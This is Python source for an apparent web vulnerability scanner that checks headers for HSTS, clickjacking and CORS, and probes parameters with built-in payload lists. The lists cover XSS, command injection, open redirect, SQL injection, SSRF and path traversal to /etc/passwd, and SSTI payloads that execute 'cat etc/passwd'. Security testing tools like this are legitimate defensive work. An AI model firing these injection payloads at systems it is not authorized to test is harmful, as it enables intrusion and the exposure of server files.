from fileinput import filename
from socket import timeout
import mechanize
from urllib import parse as urlparse
import http.cookiejar
import sys
import os
import requests
from urllib.request import urlopen
from parametizer.params import parametizer, parametizer2
from parametizer.core.save_it import save_output 
from scanners.scan_xss import xss, xss_params
from scanners.scan_idor import idor
from scanners.scan_rce import rce, rce_params
from scanners.scan_redirect import redirect, redirect_params
from scanners.scan_lfi  import lfi, lfi_params
from scanners.scan_sqli import sqli, sqli_params
from scanners.scan_ssrf import ssrf, ssrf_params
from scanners.scan_ssti import ssti, ssti_params
from urllib.error import URLError, HTTPError
from colorama import Back, Fore, init
init()

 
#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible "br"
# set cookies
cookies = http.cookiejar.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]


def scan(U,c,cl,h,x,l,s,i,r,rc,sr,sst,output,fname,o,vulnerables_urls,op,params):
    if 'http://' in U:
        pass
    elif 'https://' in U:
        for linea in U:
         U = U.replace('https://', 'http://')
    else:
        U = 'http://' + U
    try:
        br.open(U, timeout=10.0) #Opens the url
    except URLError as e:
        U = 'https://' + U
        br.open(U)
            
    #forms = br.forms() #Finds all the forms present in webpage
    try:
     headers = str(urlopen(U).headers).lower()
    except:
     r= requests.get(linea,headers)
     headers=str(r.headers).lower()

    # test hsts    
    if h:
        if 'strict-transport-security' not in headers:
            print ('\033[1;32m[+]\033[0m ' + U + ' \033[1;32mNot force HSTS\033[0m')
            vulnerables_urls.append('\n****************** VULNERABLE TO HSTS: *********************\n')
            vulnerables_urls.append(U)      
        else:
            print ('\033[1;31m[-]\033[0m ' + U + ' \033[1;31mHSTS is OK\033[0m')


    # test clickjacking          
    if cl:
        if 'x-frame-options' not in headers:
            if 'content-security-policy' not in headers:
             print ('\033[1;32m[+]\033[0m ' + U + ' \033[1;32mvulnerable to Clickjacking\033[0m')
             vulnerables_urls.append('\n****************** VULNERABLE TO CLICKJACKING: *********************\n')
             vulnerables_urls.append(U)
            else:
             print ('\033[1;31m[-]\033[0m '  + U + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')   
        else:
            print ('\033[1;31m[-]\033[0m '  + U + ' \033[1;31mis not vulnerable to Clickjacking\033[0m')

    # test cors        
    if c:
        headers = {'Origin':'https://evil.com'}
        req= requests.get(U,headers=headers,timeout=30)
        
        headers = str(urlopen(U).headers).lower()

        if 'access-control-allow-origin' in headers:
            if 'https://evil.com' in headers:
                print ('\033[1;32m[+]\033[0m ' + U + ' \033[1;32mis vulnerable to Cors\033[0m')
                vulnerables_urls.append('\n****************** VULNERABLE TO CORS: *********************\n') 
                vulnerables_urls.append(U)              
            else:
                print ('\033[1;31m[-]\033[0m ' + U + ' \033[1;31mis not vulnerable to Cors\033[0m')
        else:
            print ('\033[1;31m[-]\033[0m ' + U + ' \033[1;31mis not vulnerable to Cors\033[0m')

    if x or l or s or i or r or rc or sr or sst:
     print()
     print('\033[1;33mSearch parameters:\n\033[0m')  
     print()
    if x:
        uri=[]
        wordlist=['"><script>confirm(1)</script>']
        parametizer(U,output)
        try:
         with open(output, "r") as f:
                for q in f.readlines():
                    q = q.strip()
                    if q == "" or q.startswith("#"):
                        continue
                    uri.append(q)            
        except:
             pass
        if op:
         xss_params(uri,params)
        else:     
         print()        
         print('\033[1;33mTest xss for default payload:\033[0m')
         print()        
         xss(uri,wordlist,vulnerables_urls)            
        
    if i and op:
        uri=[]
        wordlist=['']
        parametizer(U,output)
        try: 
         with open(output, "r") as f:
                for i in f.readlines():
                    i = i.strip()
                    if i == "" or i.startswith("#"):
                        continue
                    uri.append(i)            
        except:
             pass
        print()        
        print('\033[1;33mSearch idor parameters:\033[0m')
        print()
        idor(uri,wordlist,vulnerables_urls,params)

    if rc:
        uri=[]
        wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");']
        parametizer(U,output)
        try:
         with open(output, "r") as f:
                for q in f.readlines():
                    q = q.strip()
                    if q == "" or q.startswith("#"):
                        continue
                    uri.append(q)            
        except:
             pass
        if op:
         rce_params(uri,params)
        else:     
         print()        
         print('\033[1;33mTest rce for default payload:\033[0m')
         print()        
         rce(uri,wordlist,vulnerables_urls)


    if r:
        uri=[]
        wordlist=['////example.com/','https:///example.com/','/<>//example.com',
        'https://www.whitelisteddomain.tld@google.com','//google%00.com','https:google.com','//javascript:alert(1);'
        ,'/\/\/example.com/','/https:example.com','https://google.com']
        parametizer(U,output)
        try:
         with open(output, "r") as f:
                for q in f.readlines():
                    q = q.strip()
                    if q == "" or q.startswith("#"):
                        continue
                    uri.append(q)            
        except:
             pass
        if op:
         redirect_params(uri,params)
        else:     
         print()        
         print('\033[1;33mTest redirect for default payload:\033[0m')
         print()        
         redirect(uri,wordlist,vulnerables_urls)         

    if s:
        uri=[]
        wordlist=["%27"]
        parametizer(U,output) 
        try:
         with open(output, "r") as f:
                for i in f.readlines():
                    i = i.strip()
                    if i == "" or i.startswith("#"):
                        continue
                    uri.append(i)            
        except:
             pass
        if op:
         sqli_params(uri,params)
        else:               
         print()        
         print('\033[1;33mTest sql for default payload:\033[0m')
         print()
         sqli(uri,wordlist,vulnerables_urls)     
    
    if sr:
        uri=[]
        wordlist=['file:///etc/passwd','file://\/\/etc/passwd','netdoc:///etc/passwd']
        parametizer(U,output) 
        try:
         with open(output, "r") as f:
                for i in f.readlines():
                    i = i.strip()
                    if i == "" or i.startswith("#"):
                        continue
                    uri.append(i)            
        except:
             pass
        if op:
         ssrf_params(uri,params)
        else:       
         print()        
         print('\033[1;33mTest SSRF for default payloads:\033[0m')
         print()
         ssrf(uri,wordlist,vulnerables_urls)

    if l:
        uri=[]
        wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd','\..\..\..\..\..\..\..\..\..\..\etc\passwd',
        '\..\..\..\..\..\..\..\..\..\..\etc\passwd%00','%00/etc/passwd%00','%00../../../../../../etc/passwd']
        parametizer(U,output)
        try: 
         with open(output, "r") as f:    
                for i in f.readlines():
                    i = i.strip()
                    if i == "" or i.startswith("#"):
                        continue
                    uri.append(i)            
        except:
             pass
        if op:
         lfi_params(uri,params)
        else:               
         print()        
         print('\033[1;33mTest ssti for default payload:\033[0m')
         print()
         lfi(uri,wordlist,vulnerables_urls)

    if sst:
        uri=[]
        wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]
        parametizer(U,output)
        try: 
         with open(output, "r") as f:    
                for i in f.readlines():
                    i = i.strip()
                    if i == "" or i.startswith("#"):
                        continue
                    uri.append(i)            
        except:
             pass
        if op:
         ssti_params(uri,params)
        else:        
         print()        
         print('\033[1;33mTest ssti for default payload:\033[0m')
         print()
         ssti(uri, wordlist, vulnerables_urls)

    if o:
     save_output(vulnerables_urls,fname,U)
    if op:
     save_output(params,fname,U)   

